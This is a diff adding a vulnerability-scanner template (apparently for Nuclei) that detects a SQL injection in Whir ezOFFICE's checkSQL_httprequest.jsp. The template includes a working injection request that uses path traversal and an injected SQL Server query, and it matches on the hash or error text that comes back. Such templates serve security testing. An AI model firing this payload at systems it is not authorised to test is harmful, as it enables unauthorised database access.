@@ -1,0 +1,56 @@
+id: whir-ezoffice-checksql-httprequest-sqli
+info:
+  name: Whir ezOFFICE checkSQL_httprequest.jsp SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in 万户OA ezOFFICE checkSQL_httprequest.jsp endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: check-initial
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/defaultroot"
+
+  - id: check-sqli
+    method: POST
+    path:
+      - "{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      selectSQL=select distinct convert(int,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))&dbType=sqlserver&fromSQL=--from+sysobjects+&whereSQL=--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SQL ERROR"
+          - "0x{{t2}}"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
